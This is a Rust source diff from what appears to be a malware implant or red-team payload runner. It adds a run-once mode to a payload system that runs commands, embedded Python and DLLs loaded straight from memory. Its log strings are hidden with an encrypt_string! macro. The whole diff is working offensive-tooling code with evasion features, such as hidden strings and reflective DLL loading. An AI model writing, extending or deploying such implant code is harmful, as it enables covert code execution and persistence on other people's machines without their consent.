@@ -3,6 +3,7 @@ use crate::link::{Link, LinkFetch};
 use crate::payload_util::calculate_path;
 use crate::payload_util::create_diretory;
 use crate::payload_util::same_hash_sha512;
+use crate::rundata::RunData;
 
 #[cfg(target_os = "linux")]
 use crate::payload_util::fail_linux_message;
@@ -36,7 +37,15 @@ use log::info;
 pub enum PayloadExec {
     NoThread(),
     Thread(thread::JoinHandle<()>, Payload),
+    RunOnce(Payload),
 }
+
+/*
+pub trait ExecMode {
+    fn is_thread(&self) -> bool;
+    fn is_runonce(&self) -> bool;
+}
+*/
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub enum Payload {
@@ -57,10 +66,13 @@ impl Payload {
             Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
             Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
         };
+        
+        // TODO ici le runOnce en fail, il faudrait pas renvoyer NoThread mais vérifier si c'était un RunOnce (avec un match self)
         match exec_result {
             Ok(a) => a,
             Err(e) => {
                 error!("{}{}", encrypt_string!("exec error: "), e);
+            
                 PayloadExec::NoThread()
             }
         }
@@ -81,16 +93,23 @@ impl Payload {
     }
     pub fn is_already_running(
         &self,
-        running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>,
+        run_data: &mut RunData,
     ) -> bool {
-        for running_payload in &mut *running_thread {
+        for running_payload in &mut *run_data.running_thread {
             if self.is_same_payload(&running_payload.1) {
                 info!("{}", encrypt_string!("Payload is already running"));
                 return true;
             }
         }
+        for running_once in &mut *run_data.runonce {
+            if self.is_same_payload(&running_once) {
+                info!("{}", encrypt_string!("Payload already run once"));
+                return true;
+            }
+        }
         return false;
     }
+
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
@@ -197,6 +216,7 @@ impl ExecPython {
     }
 }
 
+
 pub fn banner() -> Result<PayloadExec, anyhow::Error> {
     //TODO encrypt this str
     let banner: &str = r#"
@@ -295,6 +315,7 @@ pub struct Exec {
     pub path: String,
     pub cmdline: String,
     pub thread: bool,
+    pub runonce: bool,
 }
 impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
@@ -316,13 +337,19 @@ impl Exec {
                     .expect(&encrypt_string!("failed to execute process"));
                 let _ = c.wait();
             });
+            if self.runonce {
+                return Ok(PayloadExec::RunOnce(Payload::Exec(self.clone())));
+            }else{
             return Ok(PayloadExec::Thread(tj, Payload::Exec(self.clone())));
+            };
         } else {
             let _output: std::process::Output = comm
                 .output()
                 .expect(&encrypt_string!("failed to execute process"));
             //let _hello: Vec<u8> = output.stdout;
-            return Ok(PayloadExec::NoThread());
+            if self.runonce {
+                return Ok(PayloadExec::RunOnce(Payload::Exec(self.clone())));
+            }else{return Ok(PayloadExec::NoThread());};
         };
     }
 }
